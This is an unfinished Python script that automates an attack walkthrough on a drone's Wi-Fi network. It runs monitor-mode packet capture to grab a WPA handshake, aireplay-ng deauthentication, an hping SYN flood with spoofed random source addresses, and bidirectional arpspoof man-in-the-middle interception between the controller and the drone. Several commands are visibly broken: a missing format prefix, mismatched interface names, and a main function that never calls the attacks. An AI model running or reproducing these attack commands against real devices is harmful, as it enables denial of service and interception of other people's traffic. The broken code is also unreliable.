#!/usr/bin/env python3
"""
NOTE - THIS IS INCOMPLETE, DO NOT ATTEMPT TO RUN THIS

This script is an attempt at automating the walkthrough Sage made.

Monitor mode (RFMON) allows a wireless interface to monitor all traffic on a given channel without needing to associate with an Access Point (AP). This is essential for capturing necessary data on the drone's network.
The ALFA AWUS036ACM wireless adapter is used here because its drivers are natively supported, avoiding complex dependency installations.
- Note: You will likely need to run these commands with sudo. Be sure to replace wlan0 with your specific adapter interface (e.g., wlan1).

"""

import subprocess
import sys
import os
import datetime
import argparse

""" set config constants """
INTERFACE = "wlan1"
ACTUAL_USER = os.environ.get("SUDO_USER", "user") 
DESKTOP_PATH = f"/home/{ACTUAL_USER}/Desktop"
TIMESTAMP = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
CAPTURE_FILE = os.path.join(DESKTOP_PATH, f"capture_{TIMESTAMP}.pcapng")
LOG_FILE = os.path.join(DESKTOP_PATH, f"log_{TIMESTAMP}.txt")

def log_action(action):
    """Appends a timestamped action message to the log file."""
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{current_time}] {action}\n"
    with open(LOG_FILE, "a") as f:
        f.write(log_message)
    
    try:
        uid = int(subprocess.getoutput(f"id -u {ACTUAL_USER}"))
        gid = int(subprocess.getoutput(f"id -g {ACTUAL_USER}"))
        os.chown(LOG_FILE, uid, gid)
    except Exception:
        pass

def run_command(command):
    """Executes a shell command silently, suppressing stdout and stderr."""
    subprocess.run(command, shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


""" ------ Monitor Mode Controls ----- """

def enable_monitor_mode():
    """Stops all current processes utilizing the WiFi interface"""
    run_command("airmon-ng check kill")

    """enabling monitor mode"""
    run_command("airmon-ng start {INTERFACE}")

    """displays all WiFi networks in range and provides the target networks BSSID"""
    run_command(f"airodump-ng wlan0mon")

    """Shows clients connected to the target network (specified by BSSID and Channel -c). The -w flag dictates the directory where the capture file (which will include the WPA handshake) is saved."""
    run_command(f"airodump-ng -c Y --bssid XX:XX:XX:XX:XX:XX -w /home wlan0mon")

def disable_monitor_mode():
    """"""
    run_command(f"airmon-ng stop INTERFACE")
    run_command(f"systemctl restart NetworkManager")


""" ------ Attack Vectors ------ """

def de_auth():
    run_command(f"aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon")

def ddos():
    run_command(f"sudo hping2 -c 1500 -d 120 -S -w 64 -p 8866 --flood --rand-source 172.19.10.1")
    """
    -c 1500: Send 1500 packets.

    -d 120: Pad each packet to 120 bytes.

    -S: Set the SYN flag to initiate a TCP handshake.

    -w 64: Set TCP window size to 64.

    -p 8866: Target port 8866.

    --flood: Send packets as fast as possible, ignoring replies (creates the flood condition).

    --rand-source: Spoof a random source IP to hide the origin and prevent replies from returning.
    """

def mitm():
    """Enable packet forwarding"""
    run_command(f"sysctl -w net.ipv4.ip_forward=1")

    """intercept controller-to-drone traffic"""
    """note - Tells the controller (.100) that the attacker's MAC address is the drone (.1). (Replace .100 with the actual IP of the controller/phone)."""
    run_command(f"arpspoof -i wlan1 -t 172.19.10.100 172.19.10.1")

    """Intercept drone-to-controller traffic"""
    """note - In a new terminal window while the previous command is running"""
    run_command(f"arpspoof -i wlan1 -t 172.19.10.1 172.19.10.100")


def main():
    
    
    """SETUP FOR PARSER - JUST AN OUTLINE FOR TAKING IN ARGUMENTS"""
    parser = argparse.ArgumentParser(
        description="A generic template for handling command-line arguments.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    # 1. Required string argument
    parser.add_argument(
        "-i", "--input", 
        required=True, 
        help="The primary input value required for the script to run."
    )

    # 2. Optional integer argument with a default value
    parser.add_argument(
        "-c", "--count", 
        type=int, 
        default=5, 
        help="An optional numerical value."
    )

    # 3. Boolean flag (True if provided, False if omitted)
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true", 
        help="Enable verbose output for debugging."
    )

    args = parser.parse_args()

    # --- Script Logic Begins Here ---
    
    if args.verbose:
        print("[*] Verbose mode enabled.")
        
    print(f"[*] Input received: {args.input}")
    print(f"[*] Count set to: {args.count}")


if __name__ == "__main__":
    main()